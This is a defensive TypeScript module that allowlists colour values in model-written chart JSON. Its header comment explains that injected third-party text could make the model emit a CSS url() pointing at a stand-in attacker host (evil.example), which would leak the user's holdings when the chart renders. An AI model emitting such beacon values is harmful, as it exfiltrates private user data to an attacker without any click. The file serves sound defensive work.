/**
 * Colour sanitising for model-authored ```chart blocks.
 *
 * A chart block is JSON the model writes, and the model reads third-party text
 * (news, X posts, web search), so every field in it is attacker-influenced. The
 * colour fields reach the DOM as CSS (`style={{ background }}` on the donut
 * legend and the tooltip swatch) and as SVG paint, and a CSS value like
 * `url(https://evil.example/?d=<holdings>)` makes the browser fetch that URL the
 * moment the answer renders — a zero-click beacon carrying whatever the model
 * put in it. So a colour is accepted only when it is plainly a colour: a hex
 * literal, rgb()/hsl() with numeric arguments, a theme variable, or a bare named
 * colour. Anything else is dropped and the chart falls back to the palette.
 */

const SAFE_COLOR =
  /^(#[0-9a-f]{3,8}|(?:rgb|hsl)a?\(\s*[\d.\s,%/+-]+\)|var\(--[\w-]+\)|[a-z]{3,20})$/i;

export function safeChartColor(color: unknown): string | undefined {
  if (typeof color !== "string") return undefined;
  const c = color.trim();
  return SAFE_COLOR.test(c) ? c : undefined;
}

interface Colored {
  color?: unknown;
}

/** Return a copy of a parsed chart with every colour field sanitised. */
export function sanitizeChartColors<
  T extends { data: Colored[]; series?: Colored[] },
>(chart: T): T {
  return {
    ...chart,
    data: chart.data.map((d) => ({ ...d, color: safeChartColor(d?.color) })),
    series: chart.series?.map((s) => ({ ...s, color: safeChartColor(s?.color) })),
  };
}
